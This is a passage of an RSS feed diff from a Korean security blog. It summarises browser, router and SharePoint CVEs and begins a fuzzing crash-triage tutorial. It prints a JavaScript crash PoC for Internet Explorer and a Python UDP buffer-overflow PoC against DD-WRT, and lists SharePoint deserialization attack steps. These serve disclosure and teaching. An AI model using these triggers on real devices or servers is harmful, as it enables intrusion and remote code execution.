+      <category domain="https://hackyboiz.github.io/tags/nt-heap/">nt heap</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-21106: Double free/UAF Issue in Google Chrome</title>
+      <link>https://hackyboiz.github.io/2021/03/27/fabu1ous/2021-03-27/</link>
+      <guid>https://hackyboiz.github.io/2021/03/27/fabu1ous/2021-03-27/</guid>
+      <pubDate>Sat, 27 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/iss</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1148749">Issue 1148749: Double free/UAF in RegionDataLoaderImpl::DeleteThis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 87.0.4280.141 </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Google Chrome 87.0.4280.141 이전 버전에서 발생하는 Use after free 취약점(CVE-2021-21106)입니다. 해커는 악성 HTML 페이지를 사용해 Chrome의 renderer process에 접근 및 취약점을 트리거할 수 있고 원격 코드 실행을 통한 sandbox escape를 할 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-number">46</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegionDataLoaderImpl::OnRegionDataLoaded</span><span class="hljs-params">(<span class="hljs-keyword">bool</span> success,</span></span><span class="hljs-function"><span class="hljs-params"> <span class="hljs-number">47</span>                                               <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; country_code,</span></span><span class="hljs-function"><span class="hljs-params"> <span class="hljs-number">48</span>                                               <span class="hljs-keyword">int</span> unused_rule_count)</span> </span>&#123; <span class="hljs-number">49</span>   timer_.Stop(); <span class="hljs-number">50</span>   <span class="hljs-keyword">if</span> (!callback_.is_null()) &#123; <span class="hljs-number">51</span>     <span class="hljs-keyword">if</span> (success) &#123; <span class="hljs-number">52</span>       <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> best_region_tree_language_tag; <span class="hljs-number">53</span>       ::i18n::<span class="hljs-function">addressinput::RegionDataBuilder <span class="hljs-title">builder</span><span class="hljs-params">(&amp;region_data_supplier_)</span></span>; <span class="hljs-number">54</span>       callback_.Run( <span class="hljs-number">55</span>           builder <span class="hljs-number">56</span>               .Build(country_code, app_locale_, &amp;best_region_tree_language_tag) <span class="hljs-number">57</span>               .sub_regions()); <span class="hljs-number">58</span>     &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-number">59</span>       callback_.Run(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">const</span> ::i18n::addressinput::RegionData*&gt;()); <span class="hljs-number">60</span>     &#125; <span class="hljs-number">61</span>   &#125; <span class="hljs-number">62</span>   <span class="hljs-comment">// The deletion must be asynchronous since the caller is not quite done with</span> <span class="hljs-number">63</span>   <span class="hljs-comment">// the preload supplier.</span> <span class="hljs-number">64</span>   base::ThreadTaskRunnerHandle::Get()-&gt;PostTask( <span class="hljs-number">65</span>       FROM_HERE, base::BindOnce(&amp;RegionDataLoaderImpl::DeleteThis, <span class="hljs-number">66</span>                                 base::Unretained(<span class="hljs-keyword">this</span>))); <span class="hljs-number">67</span> &#125; <span class="hljs-number">68</span>  <span class="hljs-number">69</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegionDataLoaderImpl::DeleteThis</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-number">70</span>   <span class="hljs-keyword">delete</span> <span class="hljs-keyword">this</span>; <span class="hljs-number">71</span> &#125;</code></pre><p>파일 <code>components/autofill/core/browser/geo/region_data_loader_impl.cc</code>속 코드 일부입니다. <code>RegionDataLoaderImpl</code>을 구성할 때 함수 <code>OnRegionDataLoaded</code>가 호출되며 PostTask가 함수 <code>DeleteThis</code>를 호출해(line #64) 포인터 <code>this</code>를 해제합니다.</p><p>만약 한 번에 많은 <code>RegionDataLoaderImpl</code>을 구성할 때 동일한 PostTask를 두 번 호출하게 되면 위 작업을 두 번 수행하게되고 포인터<code>this</code>가 두 번 해제됩니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/27/fabu1ous/2021-03-27/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-26411 : Internet Explorer Use-After-Free vulnerability</title>
+      <link>https://hackyboiz.github.io/2021/03/26/l0ch/2021-03-26/</link>
+      <guid>https://hackyboiz.github.io/2021/03/26/l0ch/2021-03-26/</guid>
+      <pubDate>Fri, 26 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.htm</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">CVE-2021-26411: Internet Explorer mshtml use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft의 브라우저인 Internet Explorer에서 파싱과 렌더링을 처리하는 <code>mshtml</code> 라이브러리에서 발견된 UAF 취약점의 세부 정보가 공개되었습니다.</p><p>크래시가 발생하는 PoC는 다음과 같습니다.</p><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-keyword">var</span> elem = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;xxx&#x27;</span>); <span class="hljs-keyword">var</span> attr1 = <span class="hljs-built_in">document</span>.createAttribute(<span class="hljs-string">&#x27;yyy&#x27;</span>); <span class="hljs-keyword">var</span> attr2 = <span class="hljs-built_in">document</span>.createAttribute(<span class="hljs-string">&#x27;zzz&#x27;</span>); <span class="hljs-keyword">var</span> obj = &#123;&#125;;obj.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;elem.clearAttributes();<span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;&#125;;attr1.nodeValue = obj;attr2.nodeValue = <span class="hljs-number">123</span>;elem.setAttributeNode(attr1);elem.setAttributeNode(attr2);elem.removeAttributeNode(attr1); &lt;/script&gt;</code></pre><ol><li>HTML element 객체 <code>elem</code> 와 HTML attribute 객체 <code>attr1</code>, <code>attr2</code> 를 생성합니다.</li><li><code>attr1</code>과 <code>attr2</code> 의 <code>nodeValue</code>에 값을 할당합니다. 이때 <code>attr1</code>의 <code>nodeValue</code>에는 <code>valueOf</code> 함수가 오버 로드된 객체를 할당합니다.</li><li><code>attr1</code> 및 <code>attr2</code>를 요소 개체 <code>elem</code>으로 설정합니다.</li><li><code>elem.removeAttributeNode(attr1)</code>을 호출해 <code>elem</code>에서 <code>attr1</code>을 제거합니다.</li><li><code>removeAttributeNode</code> 메서드는 <code>elem</code> 객체의 모든 속성 객체인 <code>attr1</code> 과 <code>attr2</code>를 지우기 위해 <code>clearAttributes</code>가 호출되는 동안 <code>valueOf</code> 함수에 대한 콜백을 트리거합니다.</li><li><code>valueOf</code> 콜백이 종료되면 IE 탭 프로세스가 NULL 포인터를 참조하게 되어 크래시가 발생합니다.</li></ol><p><code>removeAttributeNode(attr1)</code>는 내부적으로 <code>CBase::GetIntoBSTRAt</code> 함수에서 <code>attr1</code>의 <code>nodeValue</code>가 존재하면 BSTR로 변환해 BSTR 값을 <code>CAttribute.nodeValue(+0x30)</code>에 저장하는데, 이 과정에서 <code>valueOf</code> 콜백이 트리거 됩니다. <code>valueOf</code> 콜백 함수의 <code>elem.clearAttributes()</code>로 인해 <code>attr1</code>이 해제된 이후 정상적인 <code>attr1</code>의 Delete 프로세스에 의해 Double Free Bug가 발생합니다.</p><p>해당 취약점을 악용하면 arbitrary read/write를 통해 원격 코드 실행으로 이어질 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/internet-explorer/">internet explorer</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/26/l0ch/2021-03-26/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-27137: DD-WRT UPNP Buffer Overflow</title>
+      <link>https://hackyboiz.github.io/2021/03/25/insu/2021-03-25/</link>
+      <guid>https://hackyboiz.github.io/2021/03/25/insu/2021-03-25/</guid>
+      <pubDate>Thu, 25 Mar 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ssd-disclosure.com/ssd-advisory-dd-wrt-upnp-buffe</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-dd-wrt-upnp-buffer-overflow/">SSD Advisory – DD-WRT UPNP Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DD-WRT</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>리눅스 기반의 무선 라우터 및 액세스 포인트 펌웨어인 DD-WRT에서 인증되지 않은 사용자가 버퍼 오버플로우를 통해 Code Execution을 할 수 있는 취약점이 발견되었습니다.</p><p>Universal Plug and Play(UPNP)는 컴퓨터, 프린터, 인터넷 게이트웨이, 와이파이 access point, 모바일 장치와 같은 네트워크 장치들이 네트워크에서 서로를 탐색하고 네트워크 서비스 기능을 제공하는 네트워크 프로토콜입니다. 기본 설정에서 DD-WRT의 UPNP는 비활성화되어 있습니다. UPNP는 UDP 형식의 인증되지 않은 프로토콜로 DD-WRT에 UPNP 서비스가 활성화된 경우 DD-WRT의 LAN에 있는 해커가 큰 크기의 <code>uuid</code> 값을 전송하여 버퍼 오버플로우를 트리거할 수 있습니다. 취약점이 존재하는 <code>ssdp.c</code> 코드는 다음과 같습니다.</p><p><img src="https://ssd-disclosure.com/wp-content/uploads/2021/03/image-1024x590.png" alt="img"></p><p>name 버퍼의 크기는 128 bytes이지만, 데이터를 복사할 때 데이터 크기 값에 대한 검증이 존재하지 않아서 버퍼 오버플로우가 발생합니다. 해당 취약점의 POC는 아래와 같습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> sockettarget_ip = <span class="hljs-string">&quot;192.168.15.124&quot;</span> <span class="hljs-comment"># IP Address of Target</span>off = <span class="hljs-string">&quot;D&quot;</span>*<span class="hljs-number">164</span>ret_addr = <span class="hljs-string">&quot;AAAA&quot;</span> payload = off + ret_addrpacket = \    <span class="hljs-string">&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span> \    <span class="hljs-string">&#x27;HOST:239.255.255.250:1900\r\n&#x27;</span> \    <span class="hljs-string">&#x27;ST:uuid:&#x27;</span>+payload+<span class="hljs-string">&#x27;\r\n&#x27;</span> \    <span class="hljs-string">&#x27;MX:2\r\n&#x27;</span> \    <span class="hljs-string">&#x27;MAN:&quot;ssdp:discover&quot;\r\n&#x27;</span> \    <span class="hljs-string">&#x27;\r\n&#x27;</span>s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)s.sendto(packet.encode(), (target_ip, <span class="hljs-number">1900</span>) )</code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bof/">bof</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/insu/">insu</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/dd-wrt/">dd-wrt</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/25/insu/2021-03-25/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-27076: SharePoint Replay Style Deserialization 취약점</title>
+      <link>https://hackyboiz.github.io/2021/03/25/idioth/2021-03-25/</link>
+      <guid>https://hackyboiz.github.io/2021/03/25/idioth/2021-03-25/</guid>
+      <pubDate>Thu, 25 Mar 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint">CVE-2021-27076: A REPLAY-STYLE DESERIALIZATION ATTACK AGAINST SHAREPOINT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft SharePoint</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePoint에서 session state를 악용하여 원격 코드 실행이 가능한 취약점이 발견되었습니다. SharePoint의 InfoPath에서 문서는 serialize 된 후 session state에 저장됩니다. session state에서 읽은 데이터는 <code>BinaryFormatter.Deserialize</code>로 전송되는데, 해커가 arbitrary data를 지정할 수 있으면 원격 코드 실행이 가능합니다.</p><p>SharePoint 애플리케이션에서 session state mechanism을 통해 첨부 파일 업로드 데이터는 첨부 파일 업로드 session state에 추가된 데이터에 해당하는 key(<code>editingSessionId</code>)를 통해 검색됩니다. 마찬가지로 <code> DocumentSessionState</code> Deserialization 데이터는 Deserialization session state에 추가된 데이터에 해당하는 key를 통해 검색됩니다. 하지만 <code>editingSessionId</code>가 클라이언트에 의해 조작될 수 있어 첨부 파일 데이터를 <code>DocumentSessionState</code> Deserialization에서 사용할 수 있습니다.</p><p>첨부 파일을 업로드할 때 session state key는 클라이언트에서 확인할 수 없고, 서버의 <code>DocumentSessionState</code> 객체에 존재합니다. 따라서 첨부 파일 mechanism의 document의 state key를 전송하여 serialize 된 <code>DocumentSessionState</code>를 클라이언트에서 첨부 파일로 받을 수 있습니다. 전체적인 공격 흐름은 다음과 같습니다.</p><ol><li>InfoPath 리스트를 생성합니다.</li><li>리스트에 새 항목을 추가합니다.</li><li>항목에 deserialize 될 arbitrary object를 포함한 fake InfoPath <code>DocumentSessionState</code> 파일을 첨부합니다.</li><li>페이지의 HTML에서 document의 state key를 가져옵니다.</li><li><code>FormServerAttachments.aspx</code> 페이지에 document의 state key를 전송하여 serialize 된 <code>DocumentSessionState</code>를 얻습니다.</li><li>반환된 데이터에서 3에서 추가한 첨부 파일의 state key를 추출합니다.</li><li>첨부 파일의 state key를 undocumented client-side API에 전송하여 deserialization mechnism에서 첨부 파일을 실행합니다. 원격 코드 실행은 arbitrary object가 서버에서 deserialization 될 때 실행됩니다.</li></ol>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/deserialization/">deserialization</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/sharepoint/">sharepoint</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/03/25/idioth/2021-03-25/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[Research] 버그헌팅 튜토리얼 Part 3</title>
+      <link>https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/</link>
+      <guid>https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/</guid>
+      <pubDate>Wed, 24 Mar 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/&quot;&gt;버그헌팅 튜토리얼 Part 1&lt;/a&gt; &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">버그헌팅 튜토리얼 Part 1</a> </p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">버그헌팅 튜토리얼 Part 2</a></p><p>저번 글에서 예고했던 대로, 본격적인 분석을 시작해보겠습니다! 이번 글은 삽질에서 시작해 삽질로 끝나는 글이므로 멘탈 나감에 유의하시기 바랍니다… 뭐 어쨌든 익스 하기만 하면 되니까요! 그럼 Part 3 시작하겠습니다.</p><h1 id="From-Crash-to-Exploit"><a href="#From-Crash-to-Exploit" class="headerlink" title="From Crash to Exploit"></a>From Crash to Exploit</h1><p>이제 제 퍼저에서 나왔던 크래시를 분석해볼게요.(위에 있는 시드 파일로 돌린 건 아닙니다. 저도 귀찮아서 그냥 크롤링해서 썼어요 ㅎㅎ) </p><p>일단 크래시 폴더에 들어가면 이렇게 파일들이 존재합니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--016.jpg" alt="./bughunting-tutorials-part3/image--016.jpg"></p><p>다른 거를 먼저 보기 전에 먼저 크래시가 재현되는지 확인해야 합니다. 간혹 가다가 재현이 안 되는 경우가 있습니다. 힙 문제여서 재현이 안 되는 경우가 대부분입니다. 재현이 잘 안 되는 크래시일 경우에는 디버깅하기에도 힘들기 때문에 재현되는 확률을 보고 확률이 너무 낮으면 다른 크래시를 분석하시는 것을 추천드립니다. </p><p>그리고 재현이 되는 지를 확인할 때에는 JIT 모드로 확인해야 합니다. 디버거를 붙인 상태에서 프로그램이 실행되면 디버거를 안 붙인 상태랑 힙 배정 등이 조금씩 달라서 재현이 되던 게 안되기도 하고 이상한 데서 크래시가 나기도 합니다. Windbg의 경우 관리자 권한으로 킨 CMD 창에서 <code>windbg –I</code> 명령어만 입력하면 바로 JIT 기능을 사용할 수 있습니다.</p><p>재현이 되는지 확인한 다음에는 보통 msec 확장자 전에 <code>e0</code>으로 되어 있는 파일을 봅니다. msec 파일은 크래시 발생 때의 모든 로그를 보여주는 데요. <code>e0</code>이 아마 처음 크래시를 났을 때의 로그 같습니다. 근데 다른 거 봐도 되긴 하는 데 저는 보통 이거 하나만 봐요. 앞에 것들은 좀 뛰어넘고 뒤에 레지스터 정보들부터 볼게요.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled.png" alt="./bughunting-tutorials-part3/Untitled.png"></p><p>운 좋게 바로 <code>call</code>에서 터졌네요!!! 뭐 이거는 운이 좋은 경우니까 ㅠㅠ 보통 다른 크래시들은 <code>call</code>이나 <code>jmp</code>에서 나는 경우가 거의 없죠 ㅠㅠㅠ 그래도 분석 방법은 똑같으니까 걍 분석하면 됩니다.</p><p>이 크래시의 시드 파일 같은 경우에는 제가 인터넷에서 크롤링해서 넣은 시드 파일이라 데이터가 뭐가 들어가 있는지 모릅니다. 사실 시드 파일을 위에서 처럼 직접 만들어서 하는 것도 좋지만 귀차니즘이 발동하고 직접 만들기 힘든 파일들도 있기 때문에 인터넷에서 크롤링해오는 것도 좋은 방법입니다. (사실 가장 큰 이유는 귀찮기 때문이죠)</p><p>암튼 이럴 때에는 먼저 hxd로 컨트롤된 값을 찾아보는 게 좋습니다. 운이 좋으면 진짜 컨트롤할 수 있는 값이 바로 있는 경우가 있거든요. 저도 이 파일을 분석할 때 운이 좋게도 <code>ecx</code>의 값이 바로 파일에 저장되어 있었고 바로 <code>ecx</code>를 컨트롤할 수 있었습니다.(뒤에 나오겠지만 메모리에 ASLR 이 걸려있어서 큰 의미는 없습니다) 보통 값에서 더하거나 빼거나 또 포인터로 사용해서 다른 값을 가져오거나 하는 경우가 많기 때문에 많은 기대를 하면 안 됩니다…. 후우… </p><p>이 정도로는 대충 알았고 다음으로 콜 스택을 봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%201.png" alt="./bughunting-tutorials-part3/Untitled%201.png"></p><p>크래시가 발생하기 직전 어떤 함수들이 불려졌는지 대략적으로 확인할 수 있습니다. 사실 이래 놓고 실제로 디버거에 확인해보면 콜 스택이 깨져있거나 좀 다르거나 하는 경우도 있는 데 여기에서는 그냥 참고만 하면 됩니다.</p><p>다음으로는 !exlploitable 모듈에서 나온 결과물입니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%202.png" alt="./bughunting-tutorials-part3/Untitled%202.png"></p><p>BFF에서는 !exploitable 의 결과로 해당 크래시가 exploitable 한 지 안 한 지를 판단하는데 사실 exploitable로 나온 거는 그럴싸하긴 한데 다른 거는 잘 모르겠네요. 개인적으로는 Unknown에 있는 크래시들이 더 익스 잘된다는 말이 많아서 이 부분은 왜 크래시가 났는지, exploitable 한 이유가 뭔지만 참고하고 넘어가면 될 거 같습니다.</p><p>간단하게 어떤 유형의 크래시인지 파악을 했고 이게 익스 가능성이 있다고 판단되면 어떤 바이트가 뮤테이트 되었는 지를 확인합니다. 앞에서 파일의 구조를 알았으니 어떤 바이트가 뮤테이트 되었는 지를 확인한다면 그 바이트가 어떤 역할을 하는지 대충은 알 수 있고 왜 크래시가 발생했는지 추측이 가능하겠죠.</p><p>Hxd로 오리지널 파일과 minimized 된 파일을 열어서 ctrl+k 를 누르면 두 파일의 차이점을 알 수 있습니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--018.jpg" alt="./bughunting-tutorials-part3/image--018.jpg"></p><pre><code class="hljs c">BITMAPINFOHEADER.biSize : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x1f</span>BITMAPINFOHEADER.biCompression : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x0A</span>BITMAPINFOHEADER.biClrUsed : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x02</span></code></pre><p>이렇게 바뀌었네요. <code>BiSize</code> 는 <code>BITMAPINFOHEADER</code> 의 크기를 나타내는 데 위에 본 구조로는 아무리 봐도 크기가 달라질 수 없다는 걸 알 수 있습니다. 따라서 프로그램에서 “여기에 있는 데이터를 가져와서 복사를 하는 데 이 데이터가 기존 크기보다 크게 되면서 복사를 더 많이 하게 된고 오버플로우가 발생하게 된다”라고 추측할 수 있을 거 같습니다.</p><p><code>biCompression</code> 과 <code>biClrUsed</code> 는 각각 압축 방식 그리고 사용된 색상수를 의미하는데 이 부분은 리버싱을 해봐야지 어떤 역할을 하는지 알 수 있겠네요.</p><p>본격적으로 리버싱을 진행할 건데 사실 리버싱을 하기 전 혹은 하면서 시나리오를 생각하고 리버싱을 진행하는 것이 좋습니다. 어느 정도는 추측을 하고 시나리오대로 리버싱을 하면 확실이 그냥 막무가내로 하는 것보다는 시간이 덜 소모되고 화가 덜 납니다 ㅎㅎ 여기에서는 일부로 시나리오를 작성 안 하고 진행할 것이지만 이 글을 다 읽고 실제로 진행할 때에는 대략적인 시나리오를 생각해두고 진행하면 좋겠죠.</p><p>그럼 이제 디버거에 붙여서 리버싱을 해볼게요. 여기에서 디버깅은 모두 windbg를 사용하겠습니다.</p><p>처음 버그헌팅을 할 때에는 이전부터 써오기도 했고 GUI 가 한눈에 딱 들어와서 이뮤니티를 쓰긴 했는 데 속도 문제 때문에 windbg로 넘어왔습니다. 특히 익스 할 때 스프레이를 해야 하는 데 정말 속 터져서;;; 제 가상 머신의 사양이 낮아서도 있겠지만 아예 뻗어버리더라구요. 그래서 windbg를 사용했더니 시간이 많이 단축되었습니다. 쓰다 보니까 원하는 거를 명령어만 간단하게 치면 원하는 것만 딱 볼 수 있어서 편하기도 해고… 지금까지 쓰고 있네요 ㅋㅋ 처음에는 CUI라는 게 좀 많이 어색하긴 하지만 크래시 분석하면서 계속 쓰다 보면 익숙해집니당.  </p><p><a href="http://windbg.info/doc/1-common-cmds.html">http://windbg.info/doc/1-common-cmds.html</a> </p><p>windbg 쓸 때 위 링크를 옆에 띄워놓고 원하는 거 하나하나 찾아가면서 써보시면 도움이 많이 될 거 같네요. 처음에는 보면서 하다가 나중에는 안 보고도 잘 쓰는 나 자신을 발견할 수 있습니다 ㅋㅋㅋ</p><p>그럼 아까 직접 제작한 파일에 똑같이 값들을 위 값들로 바꾸고 비트맵 부분을 모두 <code>0x41</code>로 바꾼 다음 디버거로 보겠습니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--020.png" alt="./bughunting-tutorials-part3/image--020.png"></p><p><code>eax</code>가 우리가 넣은 <code>0x41414141</code>로 바뀌었네요. 그럼 이 값이 어디서 오는지 봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--022.png" alt="./bughunting-tutorials-part3/image--022.png"></p><p>현재 <code>eip</code> 바로 위 인스트럭션을 보면 <code>esp</code>가 가리키는 주소에서 <code>eax</code>값을 가져오네요. 잉 근데 여기 스택인데???(이거 스택 오버 취약점 아니었는데;;;)<br>그럼 우리가 만든 파일이 어디에 로드되었는지 볼게요.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--024.png" alt="./bughunting-tutorials-part3/image--024.png"></p><p>뭔가 매우 많이 있네요;;; 비트맵 정보가 전체적으로 올라와 있는 건 <code>0x0725f056</code> ~ <code>0x0753b70d</code> 정도인 거 같네요. 그리고 스택에 있는 데이터는 이 중 어딘가에서 값을 가져온 걸로 보이고요. 아직은 뭔 갈 알 수는 없네요. 이제 콜 스택을 보면서 오버플로우가 어디에서 발생했는지 확인해 봅시다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--026.png" alt="./bughunting-tutorials-part3/image--026.png"></p><p>여기서 주의해야 할 것은 저 <code>WARNING</code>이라고 뜬 부분인데요. 디버거에서 콜 스택을 프로그램 카운터를 기반으로 보여주는데 이게 잘못되어서 제대로 못 보여주는 겁니다. 따라서 저대로 따라가도 프로그램의 흐름을 알 수가 없습니다. 그럼 어떻게 분석을 해야 할까요 ㅠㅠㅠ</p><p>보통 바이너리를 분석하는 방법은 두 가지가 있는 데 “탑다운” 방식과 “바텀업“ 방식이 있습니다.(당연히 위에서 아래로 아래에서 위로 가지 좌우로 갈 순 없잖아요?)</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--028.png" alt="./bughunting-tutorials-part3/image--028.png"></p><p>뭐 암튼 크래시가 난 그 함수에서 위로 올라가면서 볼 것이냐 아니면 크래시가 나는 부분 좀 위에서부터 모든 코드를 볼 것이냐가 문제인데… 이거는 각자의 성향 혹은 상황에 따라 결정하시면 됩니다. 최대한 분석 범위를 줄여서 리버싱 시간을 단축시키는 게 제일 현명한 선택이지만 저 같은 경우는 다른 취약점도 찾을 겸 탑다운 방식을 선호하는 편입니다.(시간 졸라 오래 걸리지만….) 주의해야 할 것은 탑다운 방식을 진행할 때 어디서부터 할지 잘 정해야 한다는 것입니다. dib 포맷의 경우에는 워낙 구조가 단순해서 분석해야 할 코드 커버리지가 작지만 다른 포맷의 경우 분석해야 할 코드량이 방대할 수 있습니다. 그렇기 때문에 분석할 뮤테이트 된 바이트를 사용하는 부분을 찾고 어떤 작업을 하는지 파악한 다음, 그 부분을 처리하는 코드의 시작 부분을 찾아내는 것이 중요합니다 ㅋㅋㅋ</p><p>그럼 이제 처음 해석하는 부분을 찾아야 하는데 헤더 부분이 BM이었죠? 분명 코드에 헤더를 비교하는 부분이 있겠죠. 그래서 아이다에서 <code>BM</code>이라는 문자열이 있는지 확인합니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--030.jpg" alt="./bughunting-tutorials-part3/image--030.jpg"></p><p>는… 망.. 없네…. 다른 건 다 있던데… 역시 인생은 내 맘대로 안되는군… 그럼 이제 편한 방법이 없으니 직접 찾아보도록 합시다 ㅠㅠ</p><p>콜 스택이 제대로 나오지 않으면 하나하나 볼 수밖에 없습니다.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--032.png" alt="./bughunting-tutorials-part3/image--032.png"></p><p>이중에 아무거나 한 번 볼게요. </p><p><img 